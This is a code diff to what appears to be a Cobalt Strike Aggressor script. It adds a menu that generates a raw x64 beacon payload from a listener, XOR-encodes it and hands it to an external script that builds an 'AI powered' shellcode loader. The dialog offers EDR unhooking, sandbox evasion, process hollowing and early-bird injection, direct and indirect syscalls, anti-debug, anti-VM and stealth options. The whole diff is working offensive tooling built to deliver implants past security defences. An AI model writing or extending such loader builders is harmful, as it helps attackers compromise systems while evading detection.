@@ -32,5 +32,113 @@ popup sleep_mutator {
     item ("AI Sleep", { 
         aiSleep();
     });
+    item ("Yah Dawg an AILoader", { 
+        shellcodeLoader();
+    });
 }
 menubar("Sleep Mutator", "sleep_mutator");
+
+
+sub generatePacker {
+    $key = $3['key'];
+    $listener = $3['listener'];
+    $output = $3['output'];
+    $allocation = $3['allocation'];
+    $execution = $3['execution'];
+    
+    # Generate the shellcode first
+    $data = artifact_payload($listener, "raw", "x64");
+    $handle = openf(">/tmp/temp_shellcode.bin");
+    writeb($handle, $data);
+    closef($handle);
+    
+    # Build command with required and optional parameters
+  # Build command with all possible parameters
+    $cmd = "python3 /path/to/offloaded.py";
+    $cmd .= " --allocation_method " . $allocation;
+    $cmd .= " --execution_method " . $execution;
+    $cmd .= " --shellcode_file /tmp/temp_shellcode.bin";
+    $cmd .= " --xor_key " . $key;
+    
+    # Add optional parameters if they're set
+    if ($3['language'] && $3['language'] ne "False") { $cmd .= " --language " . $3['language']; }
+    if ($3['sleep_time'] && $3['sleep_time'] ne "") { $cmd .= " --sleep_time " . $3['sleep_time']; }
+    if ($3['unhooking'] && $3['unhooking'] ne "False") { $cmd .= " --unhooking_method " . $3['unhooking']; }
+    if ($3['sleep_mask'] && $3['sleep_mask'] ne "False") { $cmd .= " --sleep_mask " . $3['sleep_mask']; }
+    if ($3['pause'] && $3['pause'] ne "False") { $cmd .= " --pause_mechanic " . $3['pause']; }
+    if ($3['sandbox_checks'] && $3['sandbox_checks'] ne "False") { $cmd .= " --sandbox_checks " . $3['sandbox_checks']; }
+    if ($3['sandbox_evasion'] && $3['sandbox_evasion'] ne "False") { $cmd .= " --sandbox_evasion " . $3['sandbox_evasion']; }
+    if ($3['injection_target'] && $3['injection_target'] ne "False") { $cmd .= " --injection_target " . $3['injection_target']; }
+    if ($3['syscall_method'] && $3['syscall_method'] ne "False") { $cmd .= " --syscall_method " . $3['syscall_method']; }
+
+    
+    # Add boolean flags
+    if ($3['anti_debug'] eq "true") { $cmd .= " --anti_debugging"; }
+    if ($3['anti_vm'] eq "true") { $cmd .= " --anti_virtualization"; }
+    if ($3['obfuscation'] eq "true") { $cmd .= " --obfuscation"; }
+    if ($3['stealth'] eq "true") { $cmd .= " --stealth"; }
+    
+    # Execute and handle output
+    $out = exec($cmd);
+    $data = readAll($out);
+    println("[+] Generated loader with parameters:");
+    println("    Allocation: $allocation");
+    println("    Execution: $execution");
+    println("    Key: $key");
+    println($data);
+}
+
+sub shellcodeLoader {
+    $dialog = dialog("shellcodeLoader", %(
+        listener => "Listener: ", 
+        key => "DEADBEEFDEADBEEF",
+        allocation => "Allocation Method: ",
+        execution => "Execution Method: ",
+        language => "Language: ",
+        sleep_time => "0",
+        unhooking => "Unhooking Method: ",
+        sleep_mask => "Sleep Mask: ",
+        pause => "Pause Mechanic: ",
+        sandbox_checks => "Sandbox Checks: ",
+        sandbox_evasion => "Sandbox Evasion: ",
+        injection_target => "Injection Target: ",
+        syscall_method => "Syscall Method: ",
+        anti_debug => "Anti-Debug: ",
+        anti_vm => "Anti-VM: ",
+        obfuscation => "Obfuscation: ",
+        stealth => "Stealth: "
+    ), &generatePacker);
+    
+    dialog_description($dialog, "Generates an AI powered and built custom shellcode loader");
+    
+    # Required fields
+    drow_listener($dialog, "listener", "Listener: ");
+    drow_combobox($dialog, "allocation", "Allocation Method: ", @("virtualprotect", "virtualalloc"));
+    drow_combobox($dialog, "execution", "Execution Method: ", @(
+        "createremotethread", "timesetevent", "settimer",
+        "etwpcreateetwthread", "fiber", "pointer"
+    ));
+    drow_text($dialog, "key", "XOR Key (hex): ");
+    
+    # Optional fields
+    drow_combobox($dialog, "language", "Language: ", @("C"));
+    drow_text($dialog, "sleep_time", "Sleep Time (ms): ");
+    drow_combobox($dialog, "unhooking", "Unhooking Method: ", @("False", "patch_jmp", "text_section_rewrite"));
+    drow_combobox($dialog, "sleep_mask", "Sleep Mask: ", @("dynamic", "static"));
+    drow_combobox($dialog, "pause", "Pause Mechanic: ", @("False", "sleep", "busy_loop", "yield", "thread_sleep"));
+    drow_combobox($dialog, "sandbox_checks", "Sandbox Checks: ", @("False", "registry", "file_system", "processes", "behavioral"));
+    drow_combobox($dialog, "sandbox_evasion", "Sandbox Evasion: ", @("False", "process_hollowing", "moving_shellcode", "anti_vm", "other"));
+    drow_combobox($dialog, "injection_target", "Injection Target: ", @("self", "remote", "early_bird"));
+    drow_combobox($dialog, "syscall_method", "Syscall Method: ", @("Native", "direct", "indirect", "hell"));
+    
+    # Boolean checkboxes
+    drow_checkbox($dialog, "anti_debug", "Anti-Debug: ", "Enable anti-debugging");
+    drow_checkbox($dialog, "anti_vm", "Anti-VM: ", "Enable anti-virtualization");
+    drow_checkbox($dialog, "obfuscation", "Obfuscation: ", "Enable code obfuscation");
+    drow_checkbox($dialog, "stealth", "Stealth: ", "Enable stealth techniques");
+    
+    dbutton_action($dialog, "Generate");
+    dialog_show($dialog);
+}
+
+
